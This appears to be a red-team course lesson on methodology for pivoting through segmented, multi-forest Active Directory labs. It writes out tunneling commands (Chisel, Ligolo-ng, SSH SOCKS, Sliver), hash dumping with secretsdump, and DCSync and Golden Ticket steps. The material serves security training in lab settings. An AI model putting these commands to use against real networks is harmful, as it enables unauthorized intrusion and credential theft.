---
title: "Offshore Environment Methodology — Multi-Forest Red Team Operations"
tags: [red-team, offshore, multi-forest, AD, methodology, pivoting, network-segmentation,
  kill-chain, ATT&CK, lateral-movement, trust-relationship, complex-environments]
module: 08-RedTeam-03
day: 534
related_topics:
  - Advanced Persistence Lab (Day 533)
  - SID History and Trust Attacks (Day 516)
  - Full Kill-Chain Lab Day 1 (Day 506)
  - Full Kill-Chain Lab Day 2 (Day 507)
  - Offshore Lab Episode 1 (Day 535)
---

# Day 534 — Offshore Environment Methodology

> "A single-domain lab teaches you techniques. An Offshore-style environment
> teaches you operations. The difference is: in a single domain, every machine
> is connected. In a real enterprise, you will hit a VLAN boundary, a firewall
> ACL, a forest trust boundary, and a cloud isolation layer — all between you
> and the crown jewels. Technique is useless without the operational discipline
> to chain pivots across complex segmented networks."
>
> — Ghost

---

## Goals

Understand multi-forest, multi-subnet enterprise network architecture.
Build a systematic methodology for operating in segmented environments.
Master the pivot chain: socks proxy → proxychains → tools over pivot.
Map the kill chain across network boundaries from external to domain admin.
Plan the Offshore-style lab exercises (Days 535–538).

**Prerequisites:** Days 491–530 (full red team track), networking fundamentals
(F-01 to F-03), post-exploitation basics (Day 497).
**Time budget:** 4 hours (conceptual + methodology planning day).

---

## Part 1 — What an Offshore Environment Looks Like

```
A "ProLab: Offshore" style environment (referencing HackTheBox Pro Labs)
represents a mature enterprise network with:

  External zone (Internet-facing):
    → Web servers, mail servers, VPN endpoints
    → Firewalled from internal zones
    → Your entry point

  DMZ (Demilitarized Zone):
    → Servers that need to talk to both internet and internal
    → Web application servers, reverse proxies, bastion hosts
    → Strict ACLs: limited outbound, limited inbound from internal

  Internal network (LAN — first domain):
    → Workstations, file servers, internal applications
    → First Active Directory domain (e.g., corp.local)
    → Domain controller(s)
    → Often segmented into VLANs by department

  Development / staging zone:
    → Dev servers, CI/CD pipelines
    → Often connected to both internal and internet
    → Frequently misconfigured (less oversight than production)

  IT management zone:
    → Jump servers, monitoring systems, backup servers
    → High-privilege accounts for sysadmins
    → High-value lateral movement target

  Second forest / child domain:
    → Subsidiary or acquired company forest
    → Separate domain (e.g., subsidiary.com) with forest trust to corp.local
    → Often less mature security posture

  Cloud tenant:
    → Azure AD / AWS / GCP connected to on-prem AD
    → Hybrid identity bridge (AAD Connect)
    → Crown jewels may be in cloud (AWS S3, Azure Key Vault, etc.)

Typical network topology in Offshore-style labs:
  External IP range:    10.10.110.0/24   (Internet-facing)
  DMZ:                  192.168.1.0/24   (restricted, reachable from external)
  Internal LAN:         10.10.10.0/24    (not directly reachable from external)
  IT Management:        10.10.20.0/24    (not reachable except from internal)
  Dev/Staging:          10.10.30.0/24    (limited access)
  Second forest:        10.10.50.0/24    (trust-linked to internal)
```

---

## Part 2 — The Pivot Chain Model

```
Problem: Your tooling runs on your attack host. The target is on an
  internal network your attack host cannot directly reach.

Solution: Build a pivot chain that forwards your traffic through
  compromised hosts until you can reach any target.

Single pivot (one hop):
  AttackHost → Pivot1 (DMZ host) → Internal target
  Method: SOCKS5 proxy on Pivot1, proxychains on AttackHost

Double pivot (two hops):
  AttackHost → Pivot1 (DMZ) → Pivot2 (Internal) → Deep internal target
  Method: SOCKS5 proxy chain, each hop forwarded through previous

Triple pivot:
  AttackHost → Pivot1 → Pivot2 → Pivot3 → Second forest target
  At this depth: use a C2 with native pivot (Cobalt Strike, Sliver, Metasploit)
  Manual pivot chains become unmanageable past two hops

Pivot chain architecture diagram:

  [AttackHost:1080] ──SOCKS──► [Pivot1 DMZ:22/C2]
                                     │
                              ──SSH local forward──►
                                     │
                         [Pivot2 Internal:9050] ──SOCKS──►
                                     │
                              [Internal targets]
```

### Pivot Methods and When to Use Each

```
Method 1: SSH Dynamic Port Forwarding (SOCKS5)
  Command: ssh -D 1080 -N user@pivot_host
  Then:    proxychains <tool> <target>
  Best for: Linux pivot hosts with SSH access
  Limitation: requires SSH port open or C2 channel over SSH

Method 2: Chisel (HTTP/HTTPS Tunnel)
  On pivot host: ./chisel server -p 8080 --reverse
  On attack host: ./chisel client <pivot>:8080 R:socks
  Then: proxychains <tool> <target>
  Best for: HTTP/HTTPS-only environments, web shells
  OPSEC: looks like web traffic, survives most proxies

Method 3: Ligolo-ng (TUN/TAP — Transparent Routing)
  On proxy host (attack): ./proxy -selfcert
  On agent (pivot host):  ./agent -connect <attack>:11601 -ignore-cert
  Then: ip route add <internal_subnet> dev ligolo
  Best for: complex multi-subnet environments
  OPSEC: transparent routing — no proxychains needed, tools work natively

Method 4: Metasploit Route + SOCKS (Meterpreter)
  background (meterpreter session)
  use auxiliary/server/socks_proxy
  set SRVPORT 1080; run -j
  route add <internal_subnet> <meterpreter_session_id>
  Best for: environments where Metasploit is already deployed

Method 5: Sliver Pivot Listeners
  [sliver] pivots add listener --bind 127.0.0.1:1080 --type socks5 \
    --implant <session>
  Best for: Sliver-native C2 with beacon-based callbacks

Rule: Use the simplest pivot that works.
  Web shell in DMZ → Chisel
  Meterpreter session → Metasploit route
  Linux SSH in DMZ → SSH -D
  Complex multi-hop → Ligolo-ng
```

---

## Part 3 — Offshore Kill Chain Overview

```
Phase 1 — External Foothold
  ┌─────────────────────────────────────────────────────────┐
  │ External recon → identify web/vpn/mail exposure         │
  │ Exploit web vulnerability or phishing for initial access│
  │ Establish C2 beacon from DMZ host                       │
  │ Local privilege escalation to SYSTEM/root on DMZ host   │
  │ Credential dump: local SAM, browser, config files       │
  └─────────────────────────────────────────────────────────┘
                            ↓
Phase 2 — Internal Pivot
  ┌─────────────────────────────────────────────────────────┐
  │ Deploy pivot (Chisel/Ligolo) on DMZ host                │
  │ Enumerate internal subnet (nmap via proxychains)        │
  │ Identify DC, file servers, SQL servers on internal LAN  │
  │ Lateral move via recovered credentials or SMB relay     │
  │ Establish C2 beacon on internal workstation             │
  └─────────────────────────────────────────────────────────┘
                            ↓
Phase 3 — Domain Compromise
  ┌─────────────────────────────────────────────────────────┐
  │ AD enumeration: BloodHound ingestor via proxychains     │
  │ Kerberoasting, ASREPRoasting, ADCS attacks              │
  │ Lateral movement to privileged accounts                 │
  │ DCSync or Golden Ticket → domain admin                  │
  └─────────────────────────────────────────────────────────┘
                            ↓
Phase 4 — Multi-Forest and Cloud Pivot
  ┌─────────────────────────────────────────────────────────┐
  │ Enumerate forest trusts from DA context                 │
  │ SID history / inter-forest TGT forgery                  │
  │ Pivot to subsidiary forest                              │
  │ Hybrid identity: AAD Connect MSOL account               │
  │ Cloud pivot: SSRF, managed identity, service principal  │
  └─────────────────────────────────────────────────────────┘
```

---

## Part 4 — Tooling Configuration for Multi-Hop Environments

### proxychains Configuration

```ini
# /etc/proxychains4.conf

[ProxyList]
# First hop: your SOCKS proxy on attack host
socks5 127.0.0.1 1080

# Second hop (for double pivot): forwarded through the first
# socks5 127.0.0.1 1081   ← uncomment for double pivot

# Dynamic chain — tries each proxy in sequence
dynamic_chain

# Quiet mode — reduces noise in terminal output
quiet_mode
```

```bash
# Usage examples
proxychains nmap -sT -Pn -p 80,443,445,3389 10.10.10.0/24
proxychains crackmapexec smb 10.10.10.0/24 -u 'user' -p 'pass' --shares
proxychains impacket-secretsdump domain/user:pass@10.10.10.5
proxychains bloodhound-python -u 'user' -p 'pass' \
    -ns 10.10.10.10 -d corp.local -c all

# DNS over pivot (critical — by default DNS leaks outside the proxy)
# Add to /etc/proxychains4.conf:
proxy_dns
# This routes DNS queries through the SOCKS proxy too
```

### BloodHound Ingestion via Proxy

```bash
# Option 1: bloodhound-python from attack host over proxychains
proxychains bloodhound-python -u compromised_user -p 'P@ssw0rd' \
    -ns <DC_IP> -d corp.local -c All,LoggedOn --zip

# Option 2: SharpHound on a compromised Windows host
# Transfer SharpHound.exe to the pivot host
# Execute via C2 session
execute-assembly SharpHound.exe -c All,LoggedOn --zipfilename bh.zip

# Then download the zip and import into BloodHound GUI
```

### Ligolo-ng Setup (Best for Complex Envs)

```bash
# On attack host (runs the proxy/router):
sudo ./proxy -selfcert -laddr 0.0.0.0:11601

# On compromised DMZ host (Linux agent):
./agent -connect <ATTACK_HOST>:11601 -ignore-cert

# In Ligolo-ng console:
session                            # select the agent
start                              # start the tunnel
ifconfig                           # see agent's interfaces

# On attack host — add route for internal subnet:
sudo ip route add 10.10.10.0/24 dev ligolo
# Now all traffic to 10.10.10.0/24 routes through the agent

# Test:
nmap -sV -p 445 10.10.10.5         # direct, no proxychains needed
```

---

## Part 5 — Offshore Engagement Checklist

```
Pre-engagement:
  ☐ C2 infrastructure up (redirector + teamserver)
  ☐ Pivoting tools compiled for target arch (Chisel, Ligolo agent)
  ☐ Payload variants ready: exe, DLL, PowerShell stager, PHP webshell
  ☐ Note-taking system active (Obsidian or CherryTree)
  ☐ Screenshot tool configured (flameshot or greenshot)

Phase 1 checklist (external → DMZ foothold):
  ☐ External scan complete (nmap, masscan, nuclei)
  ☐ Web app enumeration complete (subdomains, paths, APIs)
  ☐ Initial access vector identified and exploited
  ☐ Local privilege escalation achieved on DMZ host
  ☐ Credentials dumped from DMZ host (SAM, /etc/shadow, browser, config)
  ☐ C2 beacon established with stable callback

Phase 2 checklist (internal pivot):
  ☐ Internal subnet range(s) identified
  ☐ Pivot deployed and functional (test with nmap via proxychains)
  ☐ Internal hosts enumerated (DC, file servers, SQL, monitoring)
  ☐ Credentials from DMZ tested against internal hosts
  ☐ Second C2 beacon on internal host established

Phase 3 checklist (domain compromise):
  ☐ BloodHound data collected
  ☐ Attack paths identified to DA or Tier-0 assets
  ☐ Domain admin access achieved via chosen path
  ☐ DCSync executed (dump all domain hashes)
  ☐ Golden Ticket generated and tested

Phase 4 checklist (multi-forest and cloud):
  ☐ Forest trusts enumerated (nltest /domain_trusts)
  ☐ Cross-forest attack path identified
  ☐ Cloud integration enumerated (AAD Connect, ADFS, hybrid identity)
  ☐ Crown jewels accessed (final objective)

Cleanup checklist:
  ☐ All C2 beacons terminated
  ☐ Persistence mechanisms removed (all layers)
  ☐ Pivot tools removed from compromised hosts
  ☐ Newly created accounts deleted
  ☐ Modified registry keys restored
  ☐ Log tampering noted (do not delete, note what you did)
```

---

## Exercises

1. Draw a network topology diagram for an Offshore-style environment with:
   external zone, DMZ, two internal subnets, one IT management VLAN, and
   a secondary forest. Label where each tool in your kit runs and where each
   C2 beacon lives.
2. Configure Ligolo-ng in a two-machine lab (one Linux "pivot" and your attack
   host). Route your attack host's traffic for a test subnet through the pivot.
   Verify with a port scan on the test subnet — no proxychains required.
3. Write a bash script that, given a compromised host's IP and credentials,
   automatically deploys Chisel on the remote host via SCP, starts the server,
   connects from your attack host, and adds the proxychains entry. Parameters:
   IP, user, pass, remote port.
4. Document your personal "Offshore methodology reference card" — one A4 page
   covering: subnet discovery command, BloodHound collection command, pivot
   deployment steps, and the five highest-priority attack paths from any
   domain user to domain admin.

---

## Key Takeaways

1. Technique without operational discipline fails in segmented environments.
   You must pivot before you can execute. Every tool, every command, every
   pivot must be planned — not improvised under time pressure.
2. Ligolo-ng is the current best pivot tool for complex environments because
   it creates a transparent routed tunnel, eliminating the proxychains wrapper
   from every command. Speed and reliability improve significantly.
3. BloodHound is as important in multi-forest environments as in single-domain
   ones. It visualises forest trust relationships and cross-forest attack paths
   that manual enumeration misses.
4. Credential reuse is the most reliable internal pivot mechanism. Credentials
   from the DMZ host — especially service account credentials stored in config
   files — frequently have access to internal resources. Test them everywhere
   before pursuing exploitation paths.
5. The cleanup checklist is not optional — it is part of the engagement.
   On real red team engagements, failure to clean up means the blue team finds
   your artefacts during the next scan cycle and the engagement is over
   in the worst possible way.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q534.1, Q534.2 …).

---

## Navigation

← Previous: [Day 533 — Advanced Persistence Lab](DAY-0533-Advanced-Persistence-Lab.md)
→ Next: [Day 535 — Offshore Lab Episode 1: External Foothold](DAY-0535-Offshore-Lab-Episode-1-External-Foothold.md)
